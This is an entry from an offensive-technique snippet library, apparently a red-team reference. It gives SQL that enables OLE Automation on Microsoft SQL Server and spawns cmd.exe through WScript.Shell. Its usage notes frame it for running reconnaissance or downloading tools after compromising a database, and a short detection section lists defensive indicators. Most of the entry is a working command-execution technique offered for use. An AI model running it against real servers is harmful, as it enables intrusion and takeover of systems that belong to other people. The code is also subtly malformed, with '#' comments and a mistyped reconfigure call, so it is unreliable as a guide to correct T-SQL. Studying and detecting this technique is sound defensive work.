---
id: 5d667846-9ad5-4242-a0d4-693ac0bc5bfb
name: mssql-sql-enable-ole-and-execute-command
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:20.471628+00:00'
updated_at: '2023-04-10T20:36:31.777516+00:00'
platforms:
  - Windows
tags:
  - ole-automation
  - command-execution
validated: true
---

# mssql-sql-enable-ole-and-execute-command

## Code

```sql
# Enable OLE Automation
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure

# Execute commands
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
```

## Description

This SQL script enables OLE Automation on an MSSQL instance and uses it to execute an OS command via WScript.Shell. It first configures the server options, then creates a shell object and runs cmd.exe with a specified command.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (none) | No variables; replace the command after '/c' with desired OS command (e.g., 'whoami') | '%systemroot%\system32\cmd.exe /c whoami' |

## Usage

Execute this script in SSMS or sqlcmd with sysadmin privileges after gaining SQL access. Useful for initial command execution in database compromise scenarios, such as running reconnaissance or downloading tools.

## Detection

- Audit logs for sp_configure changes to 'Ole Automation Procedures'.
- Monitoring for SP_OACREATE calls with 'wscript.shell'.
- EDR alerts on cmd.exe spawns from sqlservr.exe process.
- SQL error logs showing OLE execution failures or successes.

## Related

- [[procedures/MSSQL-OLE-Automation-Command-Execution]]
